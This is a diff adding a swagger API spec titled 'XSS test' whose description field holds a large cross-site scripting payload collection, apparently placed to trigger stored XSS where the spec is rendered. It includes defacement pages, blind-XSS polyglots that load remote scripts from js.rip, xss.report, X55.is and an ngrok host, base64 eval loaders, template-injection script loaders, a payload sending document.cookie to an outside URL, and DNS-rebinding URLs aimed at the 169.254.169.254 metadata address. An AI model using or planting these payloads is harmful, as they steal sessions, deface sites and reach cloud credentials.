@@ -1,0 +1,328 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: <x onauxclick=a=alert,a(domain)>click
+
+ <html> 
+<link href="https://lh3.googleusercontent.com/-ALWE_27C5wo/AAAAAAAAAAI/AAAAAAAAAAA/VSCFLTlTPF8/photo.jpg" rel="icon" type="image/x-icon"> 
+<head>
+ <title>Ainx Was Here</title>
+<meta name=keywords content="cL0sEr"> <meta name=description content="Ainx Was Here">
+  </head>
+ <body>
+ <center> <a href="" target="_blank"> </a><br><br><br><br><br><br><br> <pre> <font face="Courier New" color="" size="5">Aing ajaksnwjsjsjsjs</font>
+ <u><strong><font color=”blue” size=”20px”>P<strong><font color=”red” size=”8px”>U<strong><font color=”gold” size=”20px”>N<strong><font color=”blue” size=”8px”>T<strong><font color=”green” size=”8px”>EUN <strong><font color=”blue” size=”8px”>G <strong><font color=”red” size=”8px”>O <strong><font color=”gold” size=”20px”>O <strong><font color=”blue” size=”8px”>G <strong><font color=”green” size=”8px”>L <strong><font color=”red” size=”8px”>E
+<img src=”https://922e-125-163-22-165.ngrok-free.app/blindxss.svg" width=”600" height=”300">
+   <iframe width="1" height="1" src="https://www.youtube.com/embed/pBcehv2Xh8o?rel=0&autoplay=1" frameborder="0" allowfullscreen="0"></iframe>
+</body>
+</html>
+
+
+
+ <html> 
+<link href="https://lh3.googleusercontent.com/-ALWE_27C5wo/AAAAAAAAAAI/AAAAAAAAAAA/VSCFLTlTPF8/photo.jpg" rel="icon" type="image/x-icon"> 
+<head>
+ <title>Ainx Was Here</title>
+<meta name=keywords content="cL0sEr"> <meta name=description content="Ainx Was Here">
+  </head>
+ <body>
+ <center> <a href="" target="_blank"> </a><br><br><br><br><br><br><br> <pre> <font face="Courier New" color="" size="5">Aing ajaksnwjsjsjsjs</font>
+ <u><strong><font color=”blue” size=”20px”>P<strong><font color=”red” size=”8px”>U<strong><font color=”gold” size=”20px”>N<strong><font color=”blue” size=”8px”>T<strong><font color=”green” size=”8px”>EUN <strong><font color=”blue” size=”8px”>G <strong><font color=”red” size=”8px”>O <strong><font color=”gold” size=”20px”>O <strong><font color=”blue” size=”8px”>G <strong><font color=”green” size=”8px”>L <strong><font color=”red” size=”8px”>E
+<img src=”https://www.sciencealert.com/images/2019-12/processed/CatsHaveFacialExpressionsButHardToRead_600.jpg" width=”600" height=”300">
+   <iframe width="1" height="1" src="https://www.youtube.com/embed/pBcehv2Xh8o?rel=0&autoplay=1" frameborder="0" allowfullscreen="0"></iframe>
+</body>
+</html>
+
+
+<iframe src="http://ckzpndn2vtc00005z2p0gj95ksayyyyyb.oast.fun">
+<a href= target=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie> cikan kuaing cobaan </a>
+
+javascript://xsolla.com%0Aalert(document.cookie);
+
+<style>@keyframesa{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>    <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(2)</a:script>    <info>     <name>    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>    </name>     <description>     <value>Hello</value>    </description>    <url>     <value>http://google.com</value>    </url>   </info>
+
+&lt;img src=&apos;#&apos; onerror=&apos; alert("1")&apos; &gt;
+
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+
+ <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
+ 
+ "><script>for(;;)alert("1");</script>
+
+content[-alert(1)-]=-1-
+
+<script%0a>alert(1)</script%0a>
+
+<script src="<%=ResolveUrl("~/Script.js") %>"></script>
+
+/(A(%22onerror='alert%601%60'testabcd))/
+
+<script>{alert'1'}</script>
+
+<html onmouseover=alert(1)>
+
+'"><img src=x onerror="alert(window.clientInformation.appVersion);">
+
+"><svg/onload="alert(window.clientInformation.appVersion);"> 
+
+ "onfocus="alert(1)" autofocus=" 
+
+ -->'"/></sCript>deTailS open x=">"ontoggle=(co\u006efirm)``>
+
+<svg><script%20?>confirm(1)
+
+javascript:alert(1)//https://dqdqdqdqdq.myshopify.com
+
+<a"/onclick=(confirm)()>click</a>
+
+<a href="javascript://%250athrow%20on{err}o}o=a{ler}t,1337">awikwok</a>
+
+ ``. “><svg/on</script>error=alert`1`>
+
+<img/src=`%00`%20onerror=this.onerror=confirm(1)
+
+<svg onx=() onload=(confirm)(1)>
+
+</Scrpt/%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>
+
+"><svg\onauxclick=promp`1337`>
+
+<Img Src=//X55.is OnError=import(src)>
+
+javascript://%EW%80%A9alert(1)
+
+<object/data="javascript&colon;alert/**/(document.domain)">//
+
+<object/data="javAscrIpt:var{a:onerror}={a:alert};throw%20document.cookie">//
+
+"/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt/">
+
+<img src=x:alert(alt) onerror=eval(src) alt='spyerror'>
+
+"><input/onauxclick="[1].map(prompt)">
+
+ "><input/onauxclick="[1].map(alert)">
+
+"></tag><svg onload=alert(1)>
+
+ "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vS29udG9sYXN0b3MueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+
+ "><img src=x id=&#61dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#61;onerror=eval(atob(this.id))>
+
+<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"><script>alert("xss");</script>
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<div onmouseover="alert('XSS');"></div>
+
+"><svg/onload=alert(1)>
+“><svg/onload=alert(document.domain)>”@x.y
+
+<noscript> <p title="</noscript><img src=x onerror=alert(1)>"></p> </noscript>
+
+"</noscript><img src="xx" onerror=alert("1")>"
+
+<img src=xx onerror=alert(1)>
+
+
+
+
+
+ <html> 
+<link href="https://lh3.googleusercontent.com/-ALWE_27C5wo/AAAAAAAAAAI/AAAAAAAAAAA/VSCFLTlTPF8/photo.jpg" rel="icon" type="image/x-icon"> 
+<head>
+ <title>Ainx Was Here</title>
+<meta name=keywords content="cL0sEr"> <meta name=description content="Ainx Was Here">
+  </head>
+ <body>
+ <center> <a href="" target="_blank"> </a><br><br><br><br><br><br><br> <pre> <font face="Courier New" color="" size="5">Aing ajaksnwjsjsjsjs</font>
+ <u><strong><font color=”blue” size=”20px”>P<strong><font color=”red” size=”8px”>U<strong><font color=”gold” size=”20px”>N<strong><font color=”blue” size=”8px”>T<strong><font color=”green” size=”8px”>EUN <strong><font color=”blue” size=”8px”>G <strong><font color=”red” size=”8px”>O <strong><font color=”gold” size=”20px”>O <strong><font color=”blue” size=”8px”>G <strong><font color=”green” size=”8px”>L <strong><font color=”red” size=”8px”>E
+<img src=”https://www.sciencealert.com/images/2019-12/processed/CatsHaveFacialExpressionsButHardToRead_600.jpg" width=”600" height=”300">
+   <iframe width="1" height="1" src="https://www.youtube.com/embed/pBcehv2Xh8o?rel=0&autoplay=1" frameborder="0" allowfullscreen="0"></iframe>
+</body>
+</html>
+
+
+
+<a href="" target="javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie"> cikan kuaing cobaan </a>
+
+
+
+<noscript><span class="fr-marker" data-id="0" data-type="true" style="display: none; line-height: 0;">&#8203;</span><span class="fr-marker" data-id="0" data-type="false" style="display: none; line-height: 0;">&#8203;</span>&lt;p title="</noscript>
+<style onload="alert(document.domain)//&quot;">
+  * {
+    /*all*/
+    color/*all*/
+    : /*all*/
+    #f78fb3/*all*/
+    ;
+  }
+
+</style>
+<noscript><img height=1 width=1 style=display:none alt="facebook pixel" src="https://www.facebook.com/tr?id=613072929103065&ev=PageView&noscript=1" onload="alert(1)"></noscript>
+
+javascript:alert(1);//https://google.com
+
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#character-escape-sequences
+
+https://web.archive.org/cdx/search/cdx?url=target.veeam.com%2F*&output=text&fl=original&collapse=urlkey&filter=statuscode%3A200
+
+
+http://wwwb-dedup.us.archive.org:8083/cdx/search?url=blockchair.com/&matchType=domain&collapse=digest&output=text&fl=original,timestamp&filter=urlkey:.*[=].*&limit=1000000&xx=&filter=statuscode%3A200
+
+'"><img src=x onerror=alert(1)>'
+
+'"><img src=x {{4*4}} "><Script /Src=https://X55.is?1=8813></Script>
+
+
+'";//'">/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//>
+--></tiTle></stYle>'";//'"></textarea>'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=8813/.source))//>
+'";//'"></textarea>'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=8813/.source))//>
+'"Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=8813/.source))//
+{{7*7}}{{7*7}}{7*7}*{7*7}{{7*7}}[[7*7]]${7*7}@(7*7)<?=7*7?><%= 7*7 %>${= 7*7}{{= 7*7}}${{7*7}}#{7*7}[=7*7][
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=8813/.source))}//\76-->
+'";//'"></textarea></script><script src=//js.rip/2khimf2r7m></script>'";//'"></textarea></script><script src=//js.rip/2khimf2r7m></script>&apos;&quot;&gt;&lt;/script&gt;&lt;script src=//js.rip/2khimf2r7m&gt;&lt;/script&gt;&amp;apos;&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=///js.rip/2khimf2r7m&amp;gt;&amp;lt;/script&amp;gt;&#39;&#34;&#62;&#60;/script&#62;&#60;script src=//js.rip/2khimf2r7m&#62;&#60;/script&#62\u0027\u0022\u003E\u003C/script\u003E\u003Cscript src=//js.rip/2khimf2r7m\u003E\u003C/script\u003E&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/2khimf2r7m&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;%27%22%3E%3C%2Fscript%3E%3Cscript%20src%3D%2F%2Fjs.rip%2Fs%2F2khimf2r7m%3E%3C%2Fscript%3E%2527%2522%253E%253C%252Fscript%253E%253Cscript%2520src%253D%252F%252Fjs.rip%252Fs%252F2khimf2r7m%253E%253C%252Fscript%253E'{{
+    constructor.constructor("var _ = document.createElement('script');
+    _.src='//js.rip/2khimf2r7m';
+    document.getElementsByTagName('body')[0].appendChild(_)")()
+}}
+
+{{
+    constructor.constructor("var _ = document.createElement('script');
+    _.src='//X55.is?1=8813';
+    document.getElementsByTagName('body')[0].appendChild(_)")()
+}}
+
+input[value='\">\<script>alert(1)//>\"']
+
+
+'/*\'/*"/*\"/*</Script><x onauxclick=/**/(import(/https:\\X55.is?1=8813/.source))//>click </x>
+
+'";//'"></textarea>'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=8813/.source))//>
+{{7*7}}{{7*7}}{7*7}*{7*7}{{7*7}}[[7*7]]${7*7}@(7*7)<?=7*7?><%= 7*7 %>${= 7*7}{{= 7*7}}${{7*7}}#{7*7}[=7*7][
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=8813/.source))}//\76-->
+
+'";//'"></textarea></script><script src=//js.rip/2khimf2r7m></script>
+
+<legend class="cd-style-h4" onclick="alert(1)">aa
+
+<x onauxclick=a=alert,a(document.domain)>click
+
+<img/src/onerror=alert/*1337*/(1)>
+<img/src/onerror=alert//&NewLine;(2)>
+<img/src/onerror=alert&sol;**&sol;(3)>
+
+javascript%3A//var{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>&#34;&#62;&#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#105;&#100;&#61;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&#32;&#111;&#110;&#101;&#114;&#111;&#114;&#61;&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#105;&#100;&#41;&#41;&#62
+
+
+
+javascript:decodeURIComponent('<script>document.location=`https://example.com?param=`+document.cookie</script>)
+
+
+data:text/html;base64,Ij48aW1nIHNyYz14ICBvbmVycm9yPWFsZXJ0KDEpPg==
+
+data:text/html;base64,JyI+Ij4nIj48L3NjcmlwdD48c2NyaXB0IHNyYz0vL2pzLnJpcC8ya2hpbWYycjdtPjwvc2NyaXB0PiZhcG9zOyZxdW90OyZndDsmbHQ7L3NjcmlwdCZndDsmbHQ7c2NyaXB0IHNyYz0vLy9qcy5yaXAvMmtoaW1mMnI3bSZndDsmbHQ7L3NjcmlwdCZndDsnIj48L3NjcmlwdD48c2NyaXB0IHNyYz0vL2pzLnJpcC8ya2hpbWYycjdtPjwvc2NyaXB0Plx1MDAyN1x1MDAyMlx1MDAzRVx1MDAzQy9zY3JpcHRcdTAwM0VcdTAwM0NzY3JpcHQgc3JjPS8vanMucmlwLzJraGltZjJyN21cdTAwM0VcdTAwM0Mvc2NyaXB0XHUwMDNFPHNjcmlwdD52YXIgYT1wYXJlbnQuZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO3BhcmVudC5kb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOzwvc2NyaXB0PiUyNyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUzQ3NjcmlwdCUyMHNyYyUzRCUyRiUyRmpzLnJpcCUyRnMlMkYya2hpbWYycjdtJTNFJTNDJTJGc2NyaXB0JTNFJTI1MjclMjUyMiUyNTNFJTI1M0MlMjUyRnNjcmlwdCUyNTNFJTI1M0NzY3JpcHQlMjUyMHNyYyUyNTNEJTI1MkYlMjUyRmpzLnJpcCUyNTJGcyUyNTJGMmtoaW1mMnI3bSUyNTNFJTI1M0MlMjUyRnNjcmlwdCUyNTNFCg==
+
+{{
+    constructor.constructor("var _ = document.createElement('script');
+    _.src='//js.rip/2khimf2r7m';
+    document.getElementsByTagName('body')[0].appendChild(_)")()
+}}
+
+{{
+    'a'.constructor.prototype.charAt=[].join;
+    $eval('x=alert(1)')+''
+}}
+
+
+javascript:"https://example.com";alert(document.domain)
+
+
+
+<a href=javascript:"https://example.com";alert(document.domain) >here</a>
+
+
+nuclei -t exposures/tokens/generic/general-tokens.yaml -u 
+
+<a href="data:text/html;base64,JyI+Ij4nIj48L3NjcmlwdD48c2NyaXB0IHNyYz0vL2pzLnJpcC8ya2hpbWYycjdtPjwvc2NyaXB0PiZhcG9zOyZxdW90OyZndDsmbHQ7L3NjcmlwdCZndDsmbHQ7c2NyaXB0IHNyYz0vLy9qcy5yaXAvMmtoaW1mMnI3bSZndDsmbHQ7L3NjcmlwdCZndDsnIj48L3NjcmlwdD48c2NyaXB0IHNyYz0vL2pzLnJpcC8ya2hpbWYycjdtPjwvc2NyaXB0Plx1MDAyN1x1MDAyMlx1MDAzRVx1MDAzQy9zY3JpcHRcdTAwM0VcdTAwM0NzY3JpcHQgc3JjPS8vanMucmlwLzJraGltZjJyN21cdTAwM0VcdTAwM0Mvc2NyaXB0XHUwMDNFPHNjcmlwdD52YXIgYT1wYXJlbnQuZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzJraGltZjJyN20iO3BhcmVudC5kb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOzwvc2NyaXB0PiUyNyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUzQ3NjcmlwdCUyMHNyYyUzRCUyRiUyRmpzLnJpcCUyRnMlMkYya2hpbWYycjdtJTNFJTNDJTJGc2NyaXB0JTNFJTI1MjclMjUyMiUyNTNFJTI1M0MlMjUyRnNjcmlwdCUyNTNFJTI1M0NzY3JpcHQlMjUyMHNyYyUyNTNEJTI1MkYlMjUyRmpzLnJpcCUyNTJGcyUyNTJGMmtoaW1mMnI3bSUyNTNFJTI1M0MlMjUyRnNjcmlwdCUyNTNFCg==
+">test</a>
+
+javascript%3A//var{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+
+javascript%3avar{a%aonerror}%3d{a%aalert}%3bthrow%2520document.cookie
+
+awikwok%26%23x27%3B%26%23x22%3B%26%23x3E%3B%26%23x3C%3B%26%2334%3B%26%2362%3B%20%26apos%3B%26quot%3B%26gt%3B%26lt%3B%7B%7B%7D%7D%5B%5D%28%29%20%22%3E%3C%3E%27%22%5Cu0022%5Cu003C%20
+%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E
+awikwok&#x27;&#x22;&#x3E;&#x3C;&#34;&#62;&apos;&quot;&gt;&lt;{{7*7}}{{7*7}}{7*7}*{7*7}{{7*7}}[[7*7]]${7*7}@(7*7)<?=7*7?><%= 7*7 %>${= 7*7}{{= 7*7}}${{7*7}}#{7*7}[=7*7][]()"><>'"\u0022\u003C
+
+
+
+<image/src/onerror=prompt(8)>
+
+
+
+
+&#x27;&#x22;&#x3E;&#x3C;&#34;&#62;&apos;&quot;&gt;&lt;{{7*7}}{{7*7}}[]()><>'\u0022\u003C
+
+alert(1337);%23
+
+test+(<script>alert(1)</script>@google.com
+test@google(<script>alert(1)</script>).com
+"(<script>alert(1)</script>)@gmail.com
+"<script>alert(1)</script>"@gmail.com
+
+＜embed src='javascript%26%63%6f%6c%6f%6e%3balert('TakSec')'＞
+%EF%BC%9Cembed%20src%3D%27javascript%2526%2563%256f%256c%256f%256e%253balert%28%27TakSec%27%29%27%EF%BC%9E
+
+
+
+R396 - 5Z6J - PL9Y - YYVT - FP5Y - XMGW centryes seek
+
+<noscript> &amp;lt;p title=" &lt;/noscript&gt;
+&lt;style onload= alert(document.cookie)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
+
+ &amp;lt;p title=" &lt;/noscript&gt;
+&lt;style onload= alert(document.domain)//&quot;&gt; *{/*w*/;} &lt;/style&gt;
+
+
+
+<iframe src="javascript:alert(1)"></iframe>
+
+
+<noscript> &amp;lt;p title=" &lt;/noscript&gt;
+&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
+
+<noscript> &amp;lt;p title=" &lt;/noscript&gt;
+&lt;style onload= alert(document.domain)//&quot;&gt; *{/*all*/color/*all*/:/*all*/#f78fb3/*all*/;} &lt;/style&gt;
+</script><noscript><img height=1 width=1 style=display:none alt="facebook pixel" src="https://www.facebook.com/tr?id=613072929103065&ev=PageView&noscript=1"></noscript>
+
+
+http://make-1.1.1.1-rebind-169.254.169.254-rr.1u.ms/
+
+
+http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms/
+
+
+<iframe width="500" height="500" src="http://make-1.1.1.1-rebind-169.254.169.254-rr.1u.ms/">
+
+
+<a data-encoded-tag-name="script" data-encoded-tag-value="" data-encoded-attr-src="JTJGJTJGanMucmlwJTJGMmtoaW1mMnI3bQ==" href="awikwok.com"></a>
+
+
+
+
+
+
+'"></script><script src=//xss.report/s/riorf></script>'"><script src=//xss.report/s/riorf></script>&apos;&quot;&gt;&lt;/script&gt;&lt;script src=//xss.report/s/riorf&gt;&lt;/script&gt;&amp;apos;&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=//xss.report/s/riorf&amp;gt;&amp;lt;/script&amp;gt;&#39;&#34;&#62;&#60;/script&#62;&#60;script src=//xss.report/s/riorf&#62;&#60;/script&#62\u0027\u0022\u003E\u003C/script\u003E\u003Cscript src=//xss.report/s/riorf\u003E\u003C/script\u003E&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/s/riorf&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;%27%22%3E%3C%2Fscript%3E%3Cscript%20src%3D%2F%2Fxss.report%2Fs%2Friorf%3E%3C%2Fscript%3E%2527%2522%253E%253C%252Fscript%253E%253Cscript%2520src%253D%252F%252Fxss.report%252Fs%252Friorf%253E%253C%252Fscript%253E
+  version: production
